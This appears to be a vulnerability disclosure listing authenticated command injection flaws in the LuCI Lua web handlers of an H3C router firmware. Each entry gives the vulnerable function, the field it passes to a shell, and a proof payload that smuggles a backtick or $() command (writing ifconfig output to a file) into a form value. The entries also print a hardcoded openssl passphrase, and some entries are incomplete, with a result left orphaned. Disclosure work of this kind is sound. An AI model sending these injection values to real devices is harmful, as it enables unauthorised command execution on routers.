## ID:  1 

### setUserIsolation函数

#### Location: 

advancedfeatures.lua

#### Description: 

command injection after login

#### Vulnerability code :

```
function setUserIsolation()
	local utl = require "luci.util"
	local isolationStatus = luci.http.formvalue('isolationStatus')
	local psStr = '/sbin/h3cisolate ' .. isolationStatus
	utl.execl(psStr) ---------------------------------->here

	luci.http.prepare_content('application/json')
	luci.http.write_json(true)
end
```

#### key attack vector

```
isolationStatus=zh-cn;ifconfig>/advancedfeatures_vul 
```

#### Result:

```
A file named "advancedfeatures_vul" occur in "/" and the content is the result of cmd "ifconfig".
```







## ID:  2 

### addDomainList函数

#### Location: 

advancedfeatures.lua

#### Description: 

command injection after login  through "domainDataInfo.domainData" 

#### Vulnerability code :

```
function addDomainList()
	local uci = luci.model.uci.cursor();
	local utl = require "luci.util"
	local cjson = require "luci.json"
	local domainDataInfo = cjson.decode(luci.http.formvalue('domainData'))

    -- local domainDataInfo = luci.http.formvalue('domainData')
	-- local domainData = strSplit(domainDataInfo, ",")
	local ret = {}
	local commandStr= "'"..domainDataInfo.domainDes.."'"
	if domainDataInfo.denyFlag == '1' then
	  ret = utl.execl("h3chostacl denyrule add \"" ..domainDataInfo.domainData .. "\"") ------>here
```


```

#### key attack vector

```
    data = {
        "domainDes":"`ifconfig>/domainDataInfo_domainDes_vul`",
        "denyFlag":"1",
        "domainData":"`ifconfig>/domainDataInfo_domainData_vul`"
    }
```

#### Result:

```
A file named "domainDataInfo_domainData_vul" occur in "/" and the content is the result of cmd "ifconfig".
```



## ID:  3

### delDomainList函数

#### Location: 

advancedfeatures.lua

#### Description: 

command injection after login  through "deleData" 

#### Vulnerability code :

```
function delDomainList()
	local utl = require "luci.util"
	local uci = luci.model.uci.cursor();
	local deleData=luci.http.formvalue('deleData')
	local delDataInfo = strSplit(deleData,',')
	local allCheckedFlag = delDataInfo[#delDataInfo-1]
	local radioFlag = delDataInfo[#delDataInfo]
	table.remove(delDataInfo)
	table.remove(delDataInfo)
	if allCheckedFlag == '1' then
	   if radioFlag == '1' then
		  utl.execl("h3chostacl denyrule clean")
	   elseif radioFlag == '0' then
	          if #delDataInfo>1 then
				  utl.execl("h3chostacl freerule clean")
			  elseif #delDataInfo == 1 then
				 for _,item in ipairs(delDataInfo) do
				  utl.execl("h3chostacl freerule delete \"" .. item .. "\"")-------->here
                  elseif allCheckedFlag == '0' then
	     if radioFlag == '1' then
            for _,item in ipairs(delDataInfo) do
		      utl.execl("h3chostacl denyrule delete \"" ..item .. "\"")-------->here
			  uci:commit('lvzhoudenylist');
			end
```

#### key attack vector

```
deleData=`ifconfig>/deleData_vul`,0,1
```

#### Result:

```
A file named "deleData_vul" occur in "/" and the content is the result of cmd "ifconfig".
```







## ID:  4

### vpnChange函数

#### Location: 

advancedfeatures.lua

#### Description: 

command injection after login  through "submitData" 

#### Vulnerability code :

```
function vpnChange()
	local util = require "luci.util"
	local uci = luci.model.uci.cursor()
	local cjson = require "luci.json"
	local submitData = cjson.decode(luci.http.formvalue("submitData"))
	local oldName = submitData.oldName
	local changeCfg = ''
	local status = util.execl('h3cvpn state "' .. oldName .. '";')[1] or '-'   ---------------->here

```

#### key attack vector

```
    data = {
        "oldName":"`ifconfig>/oldName_vul`",
    }
```

#### Result:

```
A file named "oldName_vul" occur in "/" and the content is the result of cmd "ifconfig".
```





## ID:  5

### vpnBatchDel函数

#### Location: 

advancedfeatures.lua

#### Description: 

command injection after login  through "indexList" 

#### Vulnerability code :

```
function vpnBatchDel()
	local util = require "luci.util"
	local uci = luci.model.uci.cursor()
	local cjson = require "luci.json"
	local indexList = cjson.decode(luci.http.formvalue("indexList"))
	local tunnelList = uci:get('ipsec', 'vpn', 'tunnel')
	
	for _, index in ipairs(indexList) do
		local ike = 'ike' .. index
		local sa = 'sa' .. index
		local status = util.execl('h3cvpn state ' .. index .. ';')[1]----------------> here
```


#### key attack vector

```
    data = [1, 2, "`ifconfig>/vpnBatchDel_vul`"]

    import json
    decoded_str = json.dumps(data)
```

#### Result:

```
A file named "vpnBatchDel_vul" occur in "/" and the content is the result of cmd "ifconfig".
```





## ID:  6

### checkReset函数

#### Location: 

advancedfeatures.lua

#### Description: 

command injection after login  through "resetItem" 

#### Vulnerability code :

```
function checkReset(resetItem)
	local utl = require "luci.util"
	local resetStr = '/sbin/h3creset ' .. resetItem .. 'check'
	local checkData = utl.execl(resetStr)--------------->here
	
	luci.http.prepare_content('application/json')
	luci.http.write_json(checkData)
end

```

#### key attack vector

```
`ifconfig>checkReset_vul`
```

#### Result:

```
A file named "checkReset_vul" occur in "/www/luci" and the content is the result of cmd "ifconfig".
```











## ID:  7 8 9 10

### networktoolPing函数

#### Location: 

networktool.lua

#### Description: 

command injection after login  through:

"pingCfg.times"

"pingCfg.timeout"

"pingCfg.sizes"

"pingCfg.ip"

#### Vulnerability code :

```
	local pingCmd = "ping -c" .. " " .. pingCfg.times .." " .. "-W" .. " " .. pingCfg.timeout .. " " .. "-s" .. " " .. pingCfg.sizes .. " " .. pingCfg.ip .. " " .. "> /tmp/ping.txt 2\>\&1 &"
	local pingMsg = "echo ping -c " .. pingCfg.times .." -W " .. pingCfg.timeout .. " -s " .. pingCfg.sizes .. " " .. pingCfg.ip .. " > /tmp/pingMsg.log"
	
	utl.execl(pingMsg)
	utl.execl(pingCmd)
```


#### key attack vector

```
data = {"times":"$(ifconfig>/111_vul)","timeout":"`ifconfig>/5g_vul`","sizes":"`ifconfig>/6g_vul`","ip":"`ifconfig>/7g_vul`"}
```

#### Result:

```
A file named "111_vul","5g_vul","6g_vul","7g_vul" occur in "/" and the content is the result of cmd "ifconfig".
```





## ID:  11

### wifiSwitchChange函数

#### Location: 

wificfg.lua

#### Description: 

command injection after login

#### Vulnerability code :

```
	local execlString = "h3cst2wireless "..wifiName
	utl.execl(execlString)
```


#### key attack vector

```
    data = {
        "name":"$(ifconfig>/wificfg_name_vul)",
        "status":"1"
    }
```

#### Result:

```
A file named "wificfg_name_vul" occur in "/" and the content is the result of cmd "ifconfig".
```



## ID:  12

### wifisubmit函数

#### Location: 

wificfg.lua

#### Description: 

command injection after login  through "submitData.name" 

#### Vulnerability code :

```
	local execlString = "h3cst2wireless "..submitData.name
	utl.execl(execlString)
```



#### key attack vector

```
    data = {
        "name":"$(ifconfig>/wificfg_subnmit_name_vul)",
        "status":"1"
    }
```

#### Result:

```
A file named "wificfg_subnmit_name_vul" occur in "/" and the content is the result of cmd "ifconfig".
```


## ID: 13

### vpnBatchConn函数

#### Location: 

advancedfeatures.lua（推测，与 vpnChange/vpnBatchDel 同文件）

#### Vulnerability code :

```
function vpnBatchConn()
	local util = require "luci.util"
	local cjson = require "luci.json"
	local uci = luci.model.uci.cursor()
	local connData = cjson.decode(luci.http.formvalue("connData"))
	local utilStr = "h3cvpn upall "
	local indexStr = "'"

	for _, index in ipairs(connData.indexList) do
		local status = util.execl('h3cvpn state ' .. index .. ';')[1]
		local name = uci:get('ipsec', index, 'name')
		local isFailedName = false
		...
	end
	...
	if indexStr ~= "'" then
		indexStr = string.sub(indexStr, 1, -2) .. "'"
		utilStr = utilStr .. indexStr
		io.popen(utilStr)
	end
end
```

#### key attack vector

```
data = {
    "indexList": ["1", "`ifconfig>/vpnBatchConn_vul`"],
    "failedNameList": []
}
```

#### Result:

```
A file named "vpnBatchConn_vul" occur in "/" and the content is the result of cmd "ifconfig".
```

## ID: 14

### vpnBatchDisconn函数

#### Location: 

advancedfeatures.lua

#### Vulnerability code :

```
function vpnBatchDisconn()
	local util = require "luci.util"
	local cjson = require "luci.json"
	local indexList = cjson.decode(luci.http.formvalue("indexList"))
	local utilStr = 'h3cvpn downall '
	local indexStr = "'"

	for _, index in ipairs(indexList) do
		local status = util.execl('h3cvpn state ' .. index .. ';')[1]
		if status == '1' or status == '2' then
			indexStr = indexStr .. index .. ' '
		end
	end
	...
	if indexStr ~= "'" then
		indexStr = string.sub(indexStr, 1, -2) .. "'"
		utilStr = utilStr .. indexStr
		io.popen(utilStr)
	end
end
```

#### key attack vector

```
data = ["1", "`ifconfig>/vpnBatchDisconn_vul`"]
```

#### Result:
```
A file named "vpnBatchDisconn_vul" occur in "/" and the content is the result of cmd "ifconfig".
```




#### Result:

```
A file named "apRrmChgange_vul" occur in "/" and the content is the result of cmd "ifconfig".
```


## ID: 15

### encryptCode函数


#### Vulnerability code :

```
function encryptCode (params)
	local util = require "luci.util"
	local chipTypes = publicCheckChip()
	local result
	if chipTypes == "mtk" then
		result = util.execl("echo " .. params .. "| openssl aes-128-cbc -d -a -A -pass pass:\"5paw5Y2O5LiJ56eY6ZKl\" -p")
	else
		result = util.execl("echo " .. params .. "| openssl aes-128-cbc -d -a -A -pass pass:\"5paw5Y2O5LiJ56eY6ZKl\" -p -md md5 ")
	end
	return result[4]
 end
```

#### key attack vector

```
params=`ifconfig>/encryptCode_vul`
```

#### Result:

```
A file named "encryptCode_vul" occur in "/" and the content is the result of cmd "ifconfig".
```





## ID: 16

### addVlan函数


#### Vulnerability code :

```
function addVlan()
	...
	local vlanconfstr='h3cssidvlanconfig add ' ..vlanData.vlanId
	io.popen(vlanconfstr)
	...
	local vlanbridgename='br-'..vlanName
	local vlanbridgeubusData = '{"action":"add", "bridgename":"' .. vlanbridgename .. '"}'
	local vlanbridgeubusStr = "ubus call oauthbridgecfg bridgeupdate '" .. vlanbridgeubusData .. "'"
	io.popen(vlanbridgeubusStr)
end
```

#### key attack vector

```
data = {
    "vlanId": "`ifconfig>/addVlan_vul`",
    "vlanName": "`ifconfig>/addVlan_name_vul`"
}
```

#### Result:

```
A file named "addVlan_vul" "addVlan_name_vul" occur in "/" and the content is the result of cmd "ifconfig".
```

## ID: 17

### deleteVlan函数


#### Vulnerability code :

```
function deleteVlan()
	...
	uci:delete('dhcp',vlanDelName)
	local vlanconfstr='h3cssidvlanconfig remove ' ..vlanDelId
	io.popen(vlanconfstr)	
	local vlanbridgename='br-'..vlanDelName
	local vlanbridgeubusData = '{"action":"remove", "bridgename":"' .. vlanbridgename .. '"}'
	local vlanbridgeubusStr = "ubus call oauthbridgecfg bridgeupdate '" .. vlanbridgeubusData .. "'"
	io.popen(vlanbridgeubusStr)
	uci:commit('system')
end
```

#### key attack vector

```
data = {
    "vlanDelId": "`ifconfig>/deleteVlan_vul`",
    "vlanDelName": "`ifconfig>/deleteVlan_name_vul`"
}
```

#### Result:

```
A file named "deleteVlan_vul" "deleteVlan_name_vul" occur in "/" and the content is the result of cmd "ifconfig".
```

## ID: 18

### action_bandwidth函数


#### Vulnerability code :

```
function action_bandwidth(ifaces)
	local luci_util = require "luci.util"
	local aIfaces = luci_util.split(ifaces, "_")
	local data = {}
	local i
	for i = 1, #aIfaces do
		local iface_index = ""
		local iface = aIfaces[i]
		local bwc = io.popen("luci-bwc -i %q 2>/dev/null" % iface)
		...
	end
end
```


## ID: 19

### getMtkRealtimeTraffic函数


#### Vulnerability code :

```
function getMtkRealtimeTraffic(ifaces)
	local luci_util = require "luci.util"
	local data = {}
	local file=io.open("/proc/port_enable","r")
	local statuslinklist = {}
	for line in file:lines() do
		statuslinklist[#statuslinklist+1]= string.sub(line,-1)
	end
	for _, iface in ipairs(ifaces) do
		local isPort = string.find(iface, "wifi")
		local bwc
		local portflag
		if isPort ~= nil then
			bwc = io.popen("luci-bwc -i %q 2>/dev/null" % iface)
			...
		end
	end
end
```

